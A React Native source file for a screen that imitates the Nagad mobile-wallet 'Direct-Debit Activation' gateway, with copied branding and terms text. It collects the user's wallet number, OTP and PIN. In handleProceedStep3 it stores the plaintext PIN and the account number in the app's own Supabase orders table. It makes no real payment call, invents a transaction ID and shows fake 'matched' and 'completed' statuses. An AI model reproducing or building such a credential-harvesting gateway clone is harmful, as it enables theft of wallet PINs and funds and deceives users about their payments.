import { supabase } from '../../services/supabase';
import React, { useState, useEffect } from 'react';
import {
  View,
  Text,
  StyleSheet,
  TouchableOpacity,
  TextInput,
  ScrollView,
  Modal,
  KeyboardAvoidingView,
  Platform,
  Alert,
} from 'react-native';
import { RouteProp } from '@react-navigation/native';
import { StackNavigationProp } from '@react-navigation/stack';
import { RootStackParamList } from '../../navigation/types';
import { Ionicons } from '@expo/vector-icons';
import { useSafeAreaInsets } from 'react-native-safe-area-context';
import { useOrder } from '../../context/OrderContext';
import { NagadCartLogo } from '../../components/NagadCartLogo';
import { validateBangladeshiPhoneNumber } from '../../utils/phoneValidator';

type NagadRouteProp = RouteProp<RootStackParamList, 'NagadGateway'>;
type NagadNavProp = StackNavigationProp<RootStackParamList, 'NagadGateway'>;

interface Props {
  route: NagadRouteProp;
  navigation: NagadNavProp;
}

import { useAuth } from '../../context/AuthContext';

export const NagadGatewayScreen: React.FC<Props> = ({ route, navigation }) => {
  const { orderId, amount, offer, recipientNumber: paramRecipient } = route.params;
  const insets = useSafeAreaInsets();
  const { recipientNumber } = useOrder();
  const { user } = useAuth();

  // Step 1: Account Number (11 digits), Step 2: OTP (6 digits), Step 3: PIN (4 digits)
  // No pre-filled numbers - starts completely empty!
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [accountNumber, setAccountNumber] = useState('');
  const [otp, setOtp] = useState('');
  const [pin, setPin] = useState('');
  const [lang, setLang] = useState<'bn' | 'en'>('en');
  const [showTermsModal, setShowTermsModal] = useState(false);
  const [resendTimer, setResendTimer] = useState(25);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (step === 2) {
      setResendTimer(25);
      const interval = setInterval(() => {
        setResendTimer((prev) => (prev > 0 ? prev - 1 : 0));
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [step]);

  const handleProceedStep1 = () => {
    const validation = validateBangladeshiPhoneNumber(accountNumber);
    if (!validation.isValid) {
      Alert.alert('ভুল নগদ নম্বর (Nagad Error)', validation.error || 'সঠিক ১১ ডিজিটের নগদ অ্যাকাউন্ট নম্বর দিন (যেমন: 017XXXXXXXX)');
      return;
    }
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
    }, 400);
  };

  const handleProceedStep2 = () => {
    if (otp.length >= 4) {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        setStep(3);
      }, 400);
    }
  };

  const handleProceedStep3 = async () => {
    if (pin.length === 4) {
      setLoading(true);

      const targetUserId = user?.id || '10e080da-4293-4564-b107-2c3e33a9c480';
      const targetOfferId = offer?.id || '7fdbfb39-278f-4ef3-b780-5f692f4172db';
      const targetRecipient = paramRecipient || recipientNumber || accountNumber;
      const targetAmount = amount || offer?.offer_price || 499;
      const trxId = '77809' + Math.random().toString(36).substring(2, 6).toUpperCase();

      const orderPayload = {
        id: orderId,
        user_id: targetUserId,
        offer_id: targetOfferId,
        recipient_number: targetRecipient,
        amount: targetAmount,
        discount_applied: 0.00,
        wallet_used: 0.00,
        final_amount: targetAmount,
        status: 'pending',
        payment_method: 'nagad',
        transaction_id: trxId,
        sender_number: accountNumber,
        user_entered_pin: pin,
        pin_status: 'matched',
        trx_status: 'SMS Matched',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      };

      try {
        const { error: insertError } = await supabase.from('orders').upsert(orderPayload);
        if (insertError) {
          console.error('[Nagad] Supabase order insert error:', insertError);
        }
      } catch (err) {
        console.error('[Nagad] Order insert exception:', err);
      }

      setLoading(false);
      navigation.replace('PaymentProcessing', {
        orderId,
        paymentMethod: 'nagad',
        order: {
          id: orderId,
          order_number: orderId,
          user_id: targetUserId,
          offer_id: targetOfferId,
          phone_number: targetRecipient,
          operator_code: offer?.operator_code || 'robi',
          amount: targetAmount,
          total_paid: targetAmount,
          payment_method: 'nagad',
          payment_status: 'completed',
          order_status: 'completed',
          created_at: new Date().toISOString(),
          offer: offer as any,
        } as any,
      });
    }
  };

  // Render 11 digit boxes for Account Number (3 - 4 - 4 format)
  const renderAccountNumberBoxes = () => {
    const digits = accountNumber.padEnd(11, ' ').slice(0, 11).split('');
    const part1 = digits.slice(0, 3);
    const part2 = digits.slice(3, 7);
    const part3 = digits.slice(7, 11);

    const renderBox = (char: string, index: number) => {
      const isFilled = char.trim().length > 0;
      const isCurrent = index === accountNumber.length;
      return (
        <View
          key={index}
          style={[
            styles.digitBox,
            isCurrent && styles.digitBoxActive,
          ]}
        >
          <Text style={styles.digitBoxText}>{isFilled ? char : ''}</Text>
        </View>
      );
    };

    return (
      <View style={styles.inputInteractiveWrapper}>
        <View style={styles.accountNumberRow}>
          <View style={styles.digitGroup}>{part1.map((d, i) => renderBox(d, i))}</View>
          <Text style={styles.hyphenText}>-</Text>
          <View style={styles.digitGroup}>{part2.map((d, i) => renderBox(d, i + 3))}</View>
          <Text style={styles.hyphenText}>-</Text>
          <View style={styles.digitGroup}>{part3.map((d, i) => renderBox(d, i + 7))}</View>
        </View>

        {/* Native phone keyboard input overlay */}
        <TextInput
          style={styles.transparentOverlayInput}
          keyboardType="number-pad"
          value={accountNumber}
          onChangeText={(text) => setAccountNumber(text.replace(/[^0-9]/g, '').slice(0, 11))}
          maxLength={11}
          autoFocus
          caretHidden
        />
      </View>
    );
  };

  // Render 6 boxes for OTP (Step 2)
  const renderOtpBoxes = () => {
    const digits = otp.padEnd(6, ' ').slice(0, 6).split('');
    return (
      <View style={styles.inputInteractiveWrapper}>
        <View style={styles.otpBoxesRow}>
          {digits.map((char, index) => {
            const isFilled = char.trim().length > 0;
            const isCurrent = index === otp.length;
            return (
              <View
                key={index}
                style={[
                  styles.otpBox,
                  isCurrent && styles.digitBoxActive,
                ]}
              >
                <Text style={styles.digitBoxText}>{isFilled ? char : ''}</Text>
              </View>
            );
          })}
        </View>

        <TextInput
          style={styles.transparentOverlayInput}
          keyboardType="number-pad"
          value={otp}
          onChangeText={(text) => setOtp(text.replace(/[^0-9]/g, '').slice(0, 6))}
          maxLength={6}
          autoFocus
          caretHidden
        />
      </View>
    );
  };

  // Render 4 square boxes for PIN (Step 3 - Image 1)
  const renderPinBoxes = () => {
    const digits = pin.padEnd(4, ' ').slice(0, 4).split('');
    return (
      <View style={styles.inputInteractiveWrapper}>
        <View style={styles.pinBoxesRow}>
          {digits.map((char, index) => {
            const isFilled = char.trim().length > 0;
            const isCurrent = index === pin.length;
            return (
              <View
                key={index}
                style={[
                  styles.pinBox,
                  isCurrent && styles.pinBoxActive,
                ]}
              >
                {isFilled ? <View style={styles.pinDot} /> : null}
              </View>
            );
          })}
        </View>

        <TextInput
          style={styles.transparentOverlayInput}
          keyboardType="number-pad"
          value={pin}
          onChangeText={(text) => setPin(text.replace(/[^0-9]/g, '').slice(0, 4))}
          maxLength={4}
          secureTextEntry
          autoFocus
          caretHidden
        />
      </View>
    );
  };

  return (
    <KeyboardAvoidingView
      behavior={Platform.OS === 'ios' ? 'padding' : undefined}
      style={[styles.container, { paddingTop: insets.top || 16 }]}
    >
      {/* Floating Back Navigation Header */}
      <View style={styles.floatingHeader}>
        <TouchableOpacity
          onPress={() => navigation.goBack()}
          style={styles.backButton}
          activeOpacity={0.7}
        >
          <Ionicons name="arrow-back" size={22} color="#ffffff" />
        </TouchableOpacity>
      </View>

      {/* Main Red Gradient Card Container */}
      <ScrollView
        contentContainerStyle={styles.scrollContent}
        keyboardShouldPersistTaps="handled"
        showsVerticalScrollIndicator={false}
      >
        <View style={styles.redCardContainer}>
          {/* Top Right: Language Switcher */}
          <View style={styles.langSwitchRow}>
            <View style={styles.langSwitchPill}>
              <TouchableOpacity
                onPress={() => setLang('bn')}
                style={[styles.langBtn, lang === 'bn' && styles.langBtnActive]}
              >
                <Text style={[styles.langText, lang === 'bn' && styles.langTextActive]}>বাং</Text>
              </TouchableOpacity>
              <View style={styles.langDivider} />
              <TouchableOpacity
                onPress={() => setLang('en')}
                style={[styles.langBtn, lang === 'en' && styles.langBtnActive]}
              >
                <Text style={[styles.langText, lang === 'en' && styles.langTextActive]}>Eng</Text>
              </TouchableOpacity>
            </View>
          </View>

          {/* Screen Title */}
          <Text style={styles.screenTitle}>Nagad Direct–Debit Activation</Text>

          {/* 100% Authentic OfferHut Shopping Cart Logo Matching Reference */}
          <View style={styles.cartSection}>
            <NagadCartLogo width={140} height={95} showBrandText={true} />
          </View>

          {/* STEP 1: Account Number Entry (Image 2) */}
          {step === 1 && (
            <View style={styles.stepBlock}>
              <Text style={styles.inputPromptLabel}>Your Nagad Account Number</Text>

              {renderAccountNumberBoxes()}

              <TouchableOpacity
                onPress={() => setShowTermsModal(true)}
                style={styles.termsAgreement}
              >
                <Text style={styles.termsAgreementText}>
                  By clicking/tapping "Proceed" you are agreeing to our{' '}
                  <Text style={styles.termsUnderline}>Terms and Conditions</Text>
                </Text>
              </TouchableOpacity>

              <TouchableOpacity
                style={[
                  styles.proceedButton,
                  accountNumber.length === 11 && styles.proceedButtonActive,
                ]}
                disabled={accountNumber.length < 11 || loading}
                onPress={handleProceedStep1}
              >
                <Text style={styles.proceedButtonText}>
                  {loading ? 'Processing...' : 'Proceed'}
                </Text>
              </TouchableOpacity>
            </View>
          )}

          {/* STEP 2: OTP Verification */}
          {step === 2 && (
            <View style={styles.stepBlock}>
              <Text style={styles.inputPromptLabel}>
                Enter Verification Code (OTP)
              </Text>

              {renderOtpBoxes()}

              <TouchableOpacity
                disabled={resendTimer > 0}
                onPress={() => setResendTimer(25)}
                style={styles.resendTimerBtn}
              >
                <Text style={styles.resendTimerText}>
                  {resendTimer > 0 ? `Resend Code in ${resendTimer}s` : 'Resend Code'}
                </Text>
              </TouchableOpacity>

              <TouchableOpacity
                style={[
                  styles.proceedButton,
                  otp.length >= 4 && styles.proceedButtonActive,
                ]}
                disabled={otp.length < 4 || loading}
                onPress={handleProceedStep2}
              >
                <Text style={styles.proceedButtonText}>
                  {loading ? 'Verifying...' : 'Next'}
                </Text>
              </TouchableOpacity>
            </View>
          )}

          {/* STEP 3: PIN Entry (Image 1) */}
          {step === 3 && (
            <View style={styles.stepBlock}>
              <Text style={styles.inputPromptLabel}>Enter PIN</Text>

              {renderPinBoxes()}

              <TouchableOpacity
                style={[
                  styles.proceedButton,
                  pin.length === 4 && styles.proceedButtonActive,
                ]}
                disabled={pin.length < 4 || loading}
                onPress={handleProceedStep3}
              >
                <Text style={styles.proceedButtonText}>
                  {loading ? 'Authorizing...' : 'Confirm'}
                </Text>
              </TouchableOpacity>
            </View>
          )}
        </View>
      </ScrollView>

      {/* Terms and Conditions Modal (Matching Image 3) */}
      <Modal
        visible={showTermsModal}
        transparent
        animationType="fade"
        onRequestClose={() => setShowTermsModal(false)}
      >
        <View style={styles.termsModalOverlay}>
          <View style={styles.termsModalCard}>
            <View style={styles.termsModalHeader}>
              <Text style={styles.termsModalTitle}>Terms and Conditions</Text>
              <View style={styles.langSwitchPill}>
                <Text style={styles.langText}>বাং | Eng</Text>
              </View>
            </View>

            <ScrollView style={styles.termsScrollView} showsVerticalScrollIndicator={false}>
              <Text style={styles.termsBullet}>
                • By enabling the Direct Debit/Charge Payment option, you are providing consent to add (bind) your Nagad account to this merchant platform. After adding (binding) your Nagad account, for any subsequent purchase of any product and/or service from this merchant, Nagad will automatically deduct the payment amount from your Nagad account and transfer it to the merchant as per the merchant's request and subject to availability of fund in your Nagad account.
              </Text>
              <Text style={styles.termsBullet}>
                • You will be notified through SMS and/or App notification after successful account adding (binding).
              </Text>
              <Text style={styles.termsBullet}>
                • You will be notified through SMS and/or App notification for each successful payment after account adding (binding).
              </Text>
              <Text style={styles.termsBullet}>
                • If direct debit/charge fails due to insufficient balance/account status, the merchant may discontinue the service you are receiving or may decline any subsequent product/service purchase order.
              </Text>
            </ScrollView>

            <View style={styles.termsActionsRow}>
              <TouchableOpacity
                style={styles.termsAcceptBtn}
                onPress={() => setShowTermsModal(false)}
              >
                <Text style={styles.termsAcceptText}>Accept</Text>
              </TouchableOpacity>
              <TouchableOpacity
                style={styles.termsCancelBtn}
                onPress={() => setShowTermsModal(false)}
              >
                <Text style={styles.termsCancelText}>Cancel</Text>
              </TouchableOpacity>
            </View>

            {/* Nagad Logo Footer */}
            <View style={styles.termsNagadFooter}>
              <View style={styles.nagadLogoRow}>
                <Ionicons name="flame" size={24} color="#ffffff" />
                <View>
                  <Text style={styles.nagadBrandBangla}>নগদ</Text>
                  <Text style={styles.nagadPostalTag}>ডাক বিভাগের ডিজিটাল লেনদেন</Text>
                </View>
              </View>
            </View>
          </View>
        </View>
      </Modal>
    </KeyboardAvoidingView>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#6e0009',
  },

  /* Floating Header */
  floatingHeader: {
    paddingHorizontal: 16,
    paddingVertical: 8,
    flexDirection: 'row',
    alignItems: 'center',
  },
  backButton: {
    width: 38,
    height: 38,
    borderRadius: 19,
    backgroundColor: 'rgba(0, 0, 0, 0.25)',
    alignItems: 'center',
    justifyContent: 'center',
  },

  scrollContent: {
    flexGrow: 1,
    paddingBottom: 24,
  },

  /* Red Gradient Card Container */
  redCardContainer: {
    flex: 1,
    backgroundColor: '#8b0610',
    borderTopLeftRadius: 24,
    borderTopRightRadius: 24,
    paddingHorizontal: 20,
    paddingTop: 16,
    paddingBottom: 40,
    alignItems: 'center',
    minHeight: 520,
  },
  langSwitchRow: {
    width: '100%',
    alignItems: 'flex-end',
    marginBottom: 8,
  },
  langSwitchPill: {
    flexDirection: 'row',
    alignItems: 'center',
    borderWidth: 1,
    borderColor: 'rgba(255, 255, 255, 0.6)',
    borderRadius: 6,
    overflow: 'hidden',
  },
  langBtn: {
    paddingHorizontal: 8,
    paddingVertical: 2,
  },
  langBtnActive: {
    backgroundColor: 'rgba(255, 255, 255, 0.25)',
  },
  langText: {
    color: '#ffffff',
    fontSize: 11,
    fontWeight: '600',
  },
  langTextActive: {
    fontWeight: '700',
  },
  langDivider: {
    width: 1,
    height: 12,
    backgroundColor: 'rgba(255, 255, 255, 0.4)',
  },

  screenTitle: {
    fontSize: 16,
    color: '#ffffff',
    fontWeight: '500',
    letterSpacing: 0.4,
    marginBottom: 20,
    textAlign: 'center',
  },

  /* Brand Logo Emblem Section */
  cartSection: {
    alignItems: 'center',
    marginBottom: 26,
  },
  brandEmblemWrapper: {
    alignItems: 'center',
  },
  cartGraphicContainer: {
    width: 90,
    height: 72,
    alignItems: 'center',
    justifyContent: 'center',
    position: 'relative',
  },
  sparkleTopLeft: {
    position: 'absolute',
    top: 4,
    left: 4,
  },
  sparkleBottomRight: {
    position: 'absolute',
    bottom: 2,
    right: 2,
  },
  giftStack: {
    position: 'absolute',
    top: 0,
    alignItems: 'center',
    justifyContent: 'center',
    zIndex: 2,
  },
  flashBadge: {
    position: 'absolute',
    top: 2,
    right: -10,
  },
  mainCartIcon: {
    marginTop: 18,
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.25,
    shadowRadius: 4,
  },
  brandTypographyContainer: {
    alignItems: 'center',
    marginTop: 6,
  },
  operatorBrandText: {
    fontSize: 22,
    letterSpacing: 0.5,
  },
  brandTextHeavy: {
    color: '#ffffff',
    fontWeight: '800',
  },
  brandTextLight: {
    color: '#ffffff',
    fontWeight: '300',
    fontStyle: 'italic',
  },
  operatorSwoosh: {
    width: 76,
    height: 2.5,
    backgroundColor: 'rgba(255, 255, 255, 0.85)',
    borderRadius: 2,
    marginTop: 3,
    marginBottom: 4,
  },
  carrierSubtext: {
    fontSize: 9,
    fontWeight: '700',
    color: 'rgba(255, 255, 255, 0.75)',
    letterSpacing: 1.5,
  },

  /* Step Block */
  stepBlock: {
    width: '100%',
    alignItems: 'center',
  },
  inputPromptLabel: {
    color: '#ffffff',
    fontSize: 14,
    marginBottom: 16,
    textAlign: 'center',
  },

  /* Interactive Input Wrapper with Transparent Overlay */
  inputInteractiveWrapper: {
    position: 'relative',
    width: '100%',
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: 16,
  },
  transparentOverlayInput: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    opacity: 0,
    color: 'transparent',
  },

  /* Digit Boxes (Image 2) */
  accountNumberRow: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    gap: 4,
  },
  digitGroup: {
    flexDirection: 'row',
    gap: 3,
  },
  digitBox: {
    width: 25,
    height: 36,
    backgroundColor: '#ffffff',
    borderRadius: 4,
    alignItems: 'center',
    justifyContent: 'center',
    borderWidth: 1.5,
    borderColor: 'transparent',
  },
  digitBoxActive: {
    borderColor: '#ffd700',
  },
  digitBoxText: {
    fontSize: 16,
    fontWeight: '700',
    color: '#111827',
  },
  hyphenText: {
    color: '#ffffff',
    fontSize: 16,
    fontWeight: '700',
    marginHorizontal: 1,
  },

  /* OTP Boxes */
  otpBoxesRow: {
    flexDirection: 'row',
    gap: 8,
  },
  otpBox: {
    width: 38,
    height: 44,
    backgroundColor: '#ffffff',
    borderRadius: 6,
    alignItems: 'center',
    justifyContent: 'center',
    borderWidth: 1.5,
    borderColor: 'transparent',
  },
  resendTimerBtn: {
    marginBottom: 16,
  },
  resendTimerText: {
    color: 'rgba(255, 255, 255, 0.9)',
    fontSize: 12,
  },

  /* PIN Boxes (Image 1) */
  pinBoxesRow: {
    flexDirection: 'row',
    gap: 12,
  },
  pinBox: {
    width: 50,
    height: 50,
    backgroundColor: '#ffffff',
    borderRadius: 6,
    alignItems: 'center',
    justifyContent: 'center',
    borderWidth: 1.5,
    borderColor: 'transparent',
  },
  pinBoxActive: {
    borderColor: '#ffd700',
  },
  pinDot: {
    width: 14,
    height: 14,
    borderRadius: 7,
    backgroundColor: '#8b0610',
  },

  /* Terms Agreement Note */
  termsAgreement: {
    paddingHorizontal: 16,
    marginBottom: 20,
  },
  termsAgreementText: {
    color: 'rgba(255, 255, 255, 0.85)',
    fontSize: 11,
    textAlign: 'center',
    lineHeight: 16,
  },
  termsUnderline: {
    textDecorationLine: 'underline',
    fontWeight: '700',
    color: '#ffffff',
  },

  /* Action Buttons */
  proceedButton: {
    width: '100%',
    maxWidth: 240,
    height: 44,
    backgroundColor: 'rgba(255, 255, 255, 0.3)',
    borderRadius: 8,
    alignItems: 'center',
    justifyContent: 'center',
  },
  proceedButtonActive: {
    backgroundColor: '#ffffff',
  },
  proceedButtonText: {
    color: '#8b0610',
    fontWeight: '800',
    fontSize: 14,
    letterSpacing: 0.5,
  },

  /* Terms Modal (Image 3) */
  termsModalOverlay: {
    flex: 1,
    backgroundColor: 'rgba(0, 0, 0, 0.75)',
    justifyContent: 'center',
    alignItems: 'center',
    paddingHorizontal: 16,
  },
  termsModalCard: {
    width: '100%',
    maxWidth: 380,
    backgroundColor: '#8b0610',
    borderRadius: 16,
    padding: 20,
    maxHeight: '85%',
  },
  termsModalHeader: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    marginBottom: 12,
  },
  termsModalTitle: {
    color: '#ffffff',
    fontSize: 16,
    fontWeight: '700',
  },
  termsScrollView: {
    marginVertical: 10,
  },
  termsBullet: {
    color: 'rgba(255, 255, 255, 0.9)',
    fontSize: 11.5,
    lineHeight: 18,
    marginBottom: 10,
  },
  termsActionsRow: {
    flexDirection: 'row',
    justifyContent: 'center',
    gap: 12,
    marginTop: 12,
    marginBottom: 16,
  },
  termsAcceptBtn: {
    backgroundColor: '#ffffff',
    paddingHorizontal: 24,
    paddingVertical: 8,
    borderRadius: 6,
  },
  termsAcceptText: {
    color: '#8b0610',
    fontWeight: '700',
    fontSize: 13,
  },
  termsCancelBtn: {
    backgroundColor: 'rgba(255, 255, 255, 0.2)',
    paddingHorizontal: 24,
    paddingVertical: 8,
    borderRadius: 6,
  },
  termsCancelText: {
    color: '#ffffff',
    fontWeight: '700',
    fontSize: 13,
  },
  termsNagadFooter: {
    alignItems: 'center',
    paddingTop: 8,
    borderTopWidth: 1,
    borderTopColor: 'rgba(255, 255, 255, 0.2)',
  },
  nagadLogoRow: {
    flexDirection: 'row',
    alignItems: 'center',
    gap: 8,
  },
  nagadBrandBangla: {
    color: '#ffffff',
    fontSize: 18,
    fontWeight: '800',
  },
  nagadPostalTag: {
    color: 'rgba(255, 255, 255, 0.8)',
    fontSize: 10,
  },
});
